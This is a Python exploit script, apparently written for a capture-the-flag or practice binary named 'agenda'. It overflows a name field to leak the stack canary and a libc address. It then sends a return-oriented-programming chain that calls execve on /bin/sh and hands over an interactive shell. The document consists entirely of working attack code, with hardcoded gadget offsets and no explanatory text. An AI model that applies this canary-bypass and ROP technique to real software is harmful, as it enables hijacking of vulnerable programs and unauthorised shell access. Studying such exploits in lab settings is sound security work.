from roppy import *
import struct

u64 = lambda x: struct.unpack("<Q", bytearray(x, "latin"))[0]

elf = ELF("/home/robin/Pwning/agenda")
print(elf.checksec())
p = process("/home/robin/Pwning/agenda", verbrose=False)
#pause()
p.recvuntil("\n")
p.sendline(b"1")
p.sendline(b"a"*41)
p.recvuntil("")
p.sendline(b"canary")
p.recvuntil("\n")
p.sendline(b"2")

# Converting values to hex for parsing

leak = p.recvuntil("canary")
res = ""
for i in leak:
  try:
    res += "%02x" %(ord(i))
  except:
    res += "%02x" %i

# Canary (probability of working is 90%)

p.recv(0x92)
canary = p.recv(8)
canary_value = u64(canary)
# canary_value = ''.join((x)[::-1] for x in res[1578:1613][::-1])
# canary_value = ''.join((x[::-1])[2:] if x != '0x0' else '00' for x in canary_value.split())


#canary_value = int(canary_value, 16)

# LIBC offset parse
"""
libc = res[632:646]
libc_value = ''.join(libc[i:i+2][::-1] for i in range(0,len(libc),2))[::-1]
libc_value = ('0x' + libc_value) [:14]
libc_value = int(libc_value,16) - 0x8619ce0
"""
libc_start_main_off = 0x00021ab0
p.recv(8*5)
libc_start_main = p.recv(8)
libc_start_main = u64(libc_start_main)
libc_value = libc_start_main - libc_start_main_off - 0xe7

p.sendline(b"1")
p.recvuntil("name?\n")
p.sendline(b"A"*41)
pop_rdi = 0x000000000002155f
pop_rdx = 0x0000000000001b96
pop_rsi = 0x0000000000023e6a
pop_rax = 0x00000000000439c8
syscall = 0x00000000000013c0
bin_sh = 0x001b3e9a
payload = b""
payload += b"A"*152
payload += p64(canary_value)
payload += b"junkjunk"*5
payload += p64(libc_value + pop_rdi)
payload += p64(0x0)
payload += p64(libc_value + 0xe5970)
#p.sendlineafter("description (max lenght 2625 chr)?\n",payload)
payload += p64(libc_value + pop_rdi)
payload += p64(libc_value + bin_sh)
payload += p64(libc_value + pop_rax)
payload += p64(0x3b)
payload += p64(libc_value + pop_rdx)
payload += p64(0x0)
payload += p64(libc_value + pop_rsi)
payload += p64(0x0)
payload += p64(libc_value + syscall)
p.recvuntil("description (max lenght 2625 chr)?\n")
p.sendline(payload)
p.recvuntil('3. Quit\n')
p.sendline(b"3")
#log.success("Spawning shell....\nWelcome to the world of pwning")
p.interact()